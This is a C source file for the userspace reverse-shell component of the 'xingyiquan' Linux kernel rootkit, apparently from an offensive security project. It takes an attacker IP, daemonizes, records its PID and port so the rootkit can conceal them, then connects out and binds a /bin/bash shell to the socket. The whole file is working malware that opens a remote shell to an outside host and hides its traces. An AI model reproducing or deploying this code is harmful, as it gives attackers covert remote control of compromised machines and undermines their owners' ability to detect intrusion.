/*
 * userspace bindshell for xingyiquan lkm rootkit
 *  (c) Copyright by RingLayer All Rights Reserved 
 * Developed by Sw0rdm4n
 * 
 * Official Website : www.ringlayer.net
 * 
 * Ringlayer Public License Statement V.1
 * 1. This software is free software under copyright of Ringlayer's Public License
 * 2. You may copy / modify / redistribute / share / use this software freely, but you are not allowed to remove copyright / author / url (where you got the source) if you don't modify source code logic at least 50%
 * 3. You are not allowed to sell this source code without permission from author
 * 4. Violation of any terms above means author have some rights for law processing and right to fine 
 *
DISCLAIMER !!!
Author takes no responsibility for any abuse of this software. 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "xingyi_userspace_functions.h"
#include "xingyi_userspace_config.h"

#ifndef MAX_IP_LENGTH
#	define MAX_IP_LENGTH 16
#endif
typedef int boolean;
static const boolean true = 1;
static const boolean false = 0;
static void __bc(char *ip);

void _print_usage(void)
{
	fprintf(stdout, "Usage : ./reverse_shell <ip>");
	exit(-1);
}

static inline boolean validate_ipv4_octet(char *ipaddr)
{
	int j, octet_found = 0;
	boolean valid = false;
	
	if ((sizeof(ipaddr) > 0) && ipaddr[0] != '\0') {
		if ((strlen(ipaddr) > 0) && (strlen(ipaddr) <= MAX_IP_LENGTH)) {
			for (j = 0; j < (int)(strlen(ipaddr)); j++) {
				if (ipaddr[j] == (char)0x2e) 
					octet_found++;
			}
			if (octet_found == 3 /* ip v4 address only */) 
				valid = true;
		}
	}
	else
		valid = false;
	
	return valid;
}

int main(int argc, char *argv[])
{
	char *ip = NULL;
	int retme;
	boolean _valid_ip = false;
	
	if (argc < 2) 
		_print_usage();
	ip = argv[1]; 
	_valid_ip = validate_ipv4_octet(ip);
	if (ip == NULL || _valid_ip == false)
		_print_usage();
	daemonize();
	retme = _write_pid_to_file(log_reverse_pid);
	if (retme == -1 || retme == 0) 
		fprintf(stdout, "\nWarning ! failed to hide pid ! check your write file permission !\n");
 	retme = _log_file(log_reverse_port, reverse_shell_port);
	if (retme == -1 || retme == 0) 
		fprintf(stdout, "\nWarning ! failed to hide port ! check your write file permission !\n");
	
	__bc(ip);

	return 0;
}

static void __bc(char *ip)
{
	struct sockaddr_in client_addr;
	int sock;

	client_addr.sin_family = AF_INET;
	client_addr.sin_port = htons(reverse_shell_port);
	client_addr.sin_addr.s_addr = inet_addr(ip);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(sock, (const struct sockaddr *)&client_addr,sizeof(struct sockaddr_in)) < 0) {
		fprintf(stdout, "\nFailed to connect ! exit !\n");
		exit(-1);
	}
	else {
		dup2(sock, 0);
		dup2(sock, 1);
		dup2(sock, 2);
		system("/bin/bash");
	}
}
